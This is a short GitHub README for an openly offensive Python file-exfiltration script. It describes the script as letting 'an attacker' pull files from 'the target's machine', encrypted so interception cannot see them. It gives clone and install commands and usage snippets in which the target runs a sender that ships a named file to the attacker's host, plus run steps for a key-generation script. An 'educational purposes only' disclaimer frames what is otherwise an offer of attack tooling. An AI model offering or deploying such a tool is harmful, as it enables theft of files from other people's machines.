# File Transfer

## Disclaimer

This script is for educational purposes only, I don't endorse or promote it's illegal usage

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Languages](#languages)
4. [Installations](#installations)
5. [Usage](#usage)
6. [Run](#run)

## Overview

This script allows an attacker to transfer files from the target's machine

## Features

- It crypts the file that's been sent to prevent MITM attack

## Languages

- Python 3.9.7

## Installations

```shell
git clone https://github.com/favoursyre/transfer-files.git && cd transfer-files
```

```shell
pip install requirements.txt
```

## Usage

On attacker's system in transfer.py

```python
host = "host-ip-address"
a = Transfer().receiver(host)
```

then on target's system in transfer.py

```python
host = "host-ip-address"
file = "filename.ext"
a = Transfer().sender(host,file)
```

## Run

First run the shinigami_seal.py to create the various keys

```shell
python shinigami_seal.py
```

First run on attacker's system before target's system

```shell
python transfer.py
```
